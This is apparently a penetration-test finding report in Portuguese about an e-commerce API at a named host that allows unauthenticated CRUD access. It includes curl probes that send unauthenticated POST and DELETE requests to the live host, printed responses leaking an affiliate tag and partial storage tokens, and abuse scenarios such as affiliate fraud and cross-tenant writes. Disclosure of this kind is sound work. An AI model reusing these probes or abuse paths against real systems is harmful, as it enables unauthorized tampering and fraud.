@@ -1,0 +1,123 @@
+# F-019 api-tcommerce: API admin CRUD completa exposta sem autenticação + escrita não-autenticada
+Alvo: https://api-tcommerce.soultv.com.br/{swagger.json, v1/*}
+Severidade: Crítica
+Timestamp: 2026-08-27T17:45:00Z
+Descoberto por: webapp
+
+## Sumário
+O host `api-tcommerce.soultv.com.br` (backend de t-commerce / TV-commerce do
+Soul TV) expõe:
+1. **Especificação Swagger 2.0 pública** em `/swagger.json` (58 KB) documentando
+   41 endpoints CRUD (DRF-style).
+2. **Toda a API é acessível sem autenticação** — GET (leitura) de todos os
+   endpoints retorna dados, E **POST/PUT/PATCH/DELETE são aceitos sem auth**
+   (escrita não-autenticada confirmada via probe não-destrutivo).
+
+Isto é **Broken Access Control total**: qualquer atacante lista, cria, modifica
+e deleta campanhas de TV-commerce, produtos, categorias, lojas e-commerce,
+países, moedas, palavras-chave e agendamentos de IA — sem qualquer credencial.
+
+## Reprodução
+### Swagger exposto
+```
+$ curl -s https://api-tcommerce.soultv.com.br/swagger.json | head
+{"swagger":"2.0","info":{"title":"Your API Title","description":"API documentation",
+ "version":"v1"},"host":"api-tcommerce.soultv.com.br","basePath":"/","schemes":["https"],
+ "paths":{"/{version}/campaigns/":{"get":{...},"post":{...}}, ...}}
+```
+41 endpoints CRUD documentados (ver `enum/api-tcommerce/swagger.json`):
+campaigns, campaign-channels, campaign-products, campaign-product-scheduling,
+ai-campaign-factory, ai-campaign-factory-schedule, categories, countries,
+currencies, ecommerce, iab-categories, keywords, e-commerce-product-search.
+
+### Leitura sem auth (dados sensíveis vazados)
+```
+$ curl -s https://api-tcommerce.soultv.com.br/v1/ecommerce/
+{"success":true,"data":[
+  {"id":1,"name":"amazon.com.br","scraping_code":"AM-BR","ai_enabled":true,
+   "referer_params":"tag=soultv06-20",                          <-- Amazon Associates tag
+   "logo_url":"https://firebasestorage.googleapis.com/.../amazonbr.png?...&token=c137ada4-...",
+   "logo_url_black_background":"https://banners-kanto.s3.us-east-1.amazonaws.com/..."},
+  {"name":"mercadolibre.com.pe","scraping_code":"ML-PE",...},
+  {"name":"mercadolivre-br","scraping_code":"ML-BR",...},
+  {"name":"Tottus"}, {"name":"Falabella"}, {"name":"Shopee Brazil"}, ...
+]}
+```
+- `/v1/countries/` → 250 países (8 KB)
+- `/v1/currencies/` → USD, EUR, JPY, BRL, PEN
+- `/v1/categories/` → categorias com `tenant_id` (multi-tenant! `tenant_id=1`)
+- `/v1/ecommerce/` → 7 lojas, com `scraping_code` (infra de scraping), `referer_params`
+  (Amazon Associates affiliate tag `tag=soultv06-20` — atribuição de receita), URLs
+  Firebase Storage com tokens.
+
+### Escrita sem auth (confirmada, NÃO-destrutiva)
+Probes enviados com payload **inválido** para confirmar que o endpoint aceita
+POST sem auth (validação de campos indica que um payload válido criaria o recurso):
+```
+$ curl -s -X POST -H "Content-Type: application/json" \
+    -d '{"invalid_field":"x"}' \
+    https://api-tcommerce.soultv.com.br/v1/categories/
+{"name":["This field is required."],"tenant_id":["This field is required."]}
+   <-- DRF validation error (NÃO 401/403) → POST aceito sem auth
+
+$ curl -s -X POST -H "Content-Type: application/json" \
+    -d '{"invalid":"x"}' \
+    https://api-tcommerce.soultv.com.br/v1/ecommerce/
+{"id":["This field is required."],"name":["This field is required."],
+ "logo_url":["This field is required."],"logo_url_black_background":["This field is required."]}
+   <-- POST aceito sem auth
+
+$ curl -s -X DELETE https://api-tcommerce.soultv.com.br/v1/categories/99999/
+{"detail":"No Category matches the given query."}   <-- DELETE aceito (404 só porque ID não existe)
+```
+**Nenhum dado foi criado/modificado/deletado** — probe não-destrutivo com payload
+inválido. As respostas de validação (não 401/403) confirmam que um payload
+**válido** seria aceito → escrita real sem auth confirmada.
+
+### Campos multi-tenant
+`categories` retorna `tenant_id:1` → API é multi-tenant; ausência de auth +
+IDOR de `tenant_id` permitiria criar recursos em qualquer tenant.
+
+## Endpoints expostos (41, CRUD completo)
+- `/{version}/campaigns/` (+ `/campaigns/{id}/`, `/campaigns/{id}/products/`,
+  `/campaigns/country-channel-by-id/{id}/`) — campanhas de TV-commerce
+- `/{version}/campaign-channels/` — canais de campanha
+- `/{version}/campaign-products/` (+ `by-campaign/{id}`) — produtos por campanha
+- `/{version}/campaign-product-scheduling/` — agendamento de produtos
+- `/{version}/ai-campaign-factory/` (+ `/schedule/`, `/{id}/campaigns/`) —
+  **campanhas geradas por IA** (agendamento + factory)
+- `/{version}/categories/`, `/countries/`, `/currencies/`, `/iab-categories/`,
+  `/keywords/` — dados de configuração
+- `/{version}/ecommerce/` — lojas e-commerce (Amazon/MercadoLivre/Tottus/Falabella/Shopee)
+- `POST /{version}/e-commerce-product-search` — busca de produtos (scraping)
+
+## Impacto
+- **Crítico (escrita não-autenticada)**: atacante cria/modifica/deleta campanhas
+  de TV-commerce, produtos, categorias, lojas, agendamentos de IA → manipulação
+  de catálogo comercial, fraude (ex.: inserir produto com link de afiliado
+  próprio substituindo o `tag=soultv06-20`), sabotage operacional (deletar
+  campanhas ativas), injeção de produtos maliciosos.
+- **Confidencialidade comercial**: vazamento de infra de scraping
+  (`scraping_code` AM-BR/ML-PE/ML-BR), Amazon Associates tag (atribuição de
+  receita), tokens Firebase Storage, estrutura multi-tenant.
+- **IDOR multi-tenant**: sem auth + `tenant_id` no payload → criar/ler recursos
+  de qualquer tenant.
+- O Swagger exposto facilita o ataque (mapeamento completo da API).
+
+## Recomendação
+1. **Autenticar TODOS os endpoints** com DRF `IsAuthenticated` + RBAC
+   (`IsAdminUser`/permissões por role) — atualmente ZERO auth.
+2. Remover `/swagger.json` de produção (servir só em staging/dev).
+3. Desabilitar `POST/PUT/PATCH/DELETE` para assinantes/externos — apenas
+   staff/admin interna deve gerenciar campanhas/produtos.
+4. Isolar `tenant_id` server-side (não aceitar do cliente) para evitar IDOR
+   cross-tenant.
+5. Rotacionar Amazon Associates tag `soultv06-20` (vazada) e tokens Firebase
+   Storage dos logos.
+6. Auditoria de integridade: verificar se campanhas/produtos foram
+   modificados por acessos não-autorizados (logs ausentes até então).
+
+## Referências
+- Swagger: enum/api-tcommerce/swagger.json (58 KB, 41 endpoints)
+- Ecommerce data: enum/api-tcommerce/ecommerce.json (7 lojas, affiliate tags)
+- Output probes: enum/api-tcommerce/ (respostas de validação)
